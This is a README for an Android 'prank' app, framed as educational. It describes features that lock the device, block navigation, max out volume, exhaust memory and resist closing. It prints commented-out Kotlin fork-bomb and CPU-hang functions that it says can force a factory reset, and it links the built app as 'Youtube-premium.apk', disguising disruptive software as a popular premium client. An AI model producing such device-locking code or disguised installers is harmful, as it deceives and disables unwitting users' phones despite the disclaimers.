
#  Prank App 

##  Important Notice
This app is a **personal project** created for **educational purposes only**. It explores Android system interactions by simulating temporary device unresponsiveness.

##  Disclaimer
-  **Not a Real Utility**: This is a proof-of-concept app for learning Android development.
-  **Use Responsibly**: Do **not** deploy it on others' devices without explicit consent.
-  **Testing**: Test only on **emulators** or **spare devices**. The app may cause temporary frustration!
-  **No Guarantees**: This project is experimental and may behave unpredictably on certain devices.

---

##  Features
- **Fullscreen Activity Lock**: Prevents user interaction by blocking navigation buttons.
- **Max Volume Override**: Automatically sets media volume to the maximum.
- **Persistent Loop**: Forces user to confirm an action repeatedly.
- **Memory Consumption**: Simulates heavy RAM usage.
- **Overlay Lock**: Attempts to prevent closing the app.

---

##  Dangerous Code (Commented Out)
The source code contains **commented-out functions** that could make a device **completely unresponsive** if executed. These include:

###  Fork Bomb (`forkBomb()`)
Opens multiple instances of the app repeatedly, causing the device to freeze.

```kotlin
//    private fun forkBomb(context: Context) {
//        while (true) {
//            val intent = Intent(context, MainActivity::class.java)
//            context.startActivity(intent)
//            context.startActivity(intent)
//            context.startActivity(intent) // Opens new instances of the app repeatedly
//        }
//    }
```

###  CPU Hang Attack (`hangDevice()`)
Runs an infinite loop of CPU-intensive operations, making the device unresponsive.

```kotlin
//    private fun hangDevice() {
//        while (true) {
//            // This runs in a loop, keeping the CPU busy
//            Math.sqrt(999999999.999)
//            Math.sqrt(999999999.999)
//            Math.sqrt(999999999.999)
//        }
//    }
```

###  **Phone Kill Attacks (Commented Out for Safety)**

```kotlin
// forkBomb(this)
// hangDevice()
```
 **These functions are commented out for safety reasons. Running them may require a hard reset or factory reset to recover the device!**

---

##  APK for Reference
I am attaching the **[Youtube-premium.apk](https://github.com/amgaikwad4588/Android-Prank-App/raw/refs/heads/main/output-debug/apk%20package/Youtube-Premium.apk)** here for reference, allowing you to see the app in action without compiling the source code yourself.

###  **Final Warning**
**I am not responsible for any misuse of this code. Use with caution!** 🚀
